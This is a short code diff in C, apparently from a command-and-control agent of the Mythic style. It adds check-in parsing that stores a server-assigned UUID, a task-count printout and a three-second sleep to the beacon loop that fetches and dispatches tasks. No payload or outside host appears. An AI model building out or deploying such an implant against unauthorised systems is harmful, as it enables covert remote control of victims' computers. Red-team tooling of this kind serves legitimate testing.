@@ -1,10 +1,13 @@
+#include "ceos.h"
 #include "Command.h"
-
 
 
 BOOL handleGetTasking(PParser getTasking)
 {
 	UINT32 numTasks = getInt32(getTasking);
+	if (numTasks)
+		printf("Got %d tasks !\n", numTasks);
+
 	for (UINT32 i = 0; i < numTasks; i++)
 	{
 		SIZE_T sizeTask = getInt32(getTasking) - 1;
@@ -35,15 +38,35 @@ BOOL commandDispatch(PParser response)
 }
 
 
+BOOL parseCheckin(PParser ResponseParser) {
+	if (getByte(ResponseParser) != CHECKIN)
+	{
+		freeParser(ResponseParser);
+		return FALSE;
+	}
+
+	SIZE_T sizeUuid = 36;
+	PCHAR newUUID = getString(ResponseParser, &sizeUuid);
+	setUUID(newUUID);
+
+	freeParser(ResponseParser);
+
+	return TRUE;
+}
+
+
 BOOL routine()
 {
 	PPackage getTask = newPackage(GET_TASKING, TRUE);
 	addInt32(getTask, 1);
 	Parser* ResponseParser = sendPackage(getTask);
+
 	if (!ResponseParser)
 		return FALSE;
 
 	commandDispatch(ResponseParser);
+
+	Sleep(3000);
 
 	return TRUE;
 
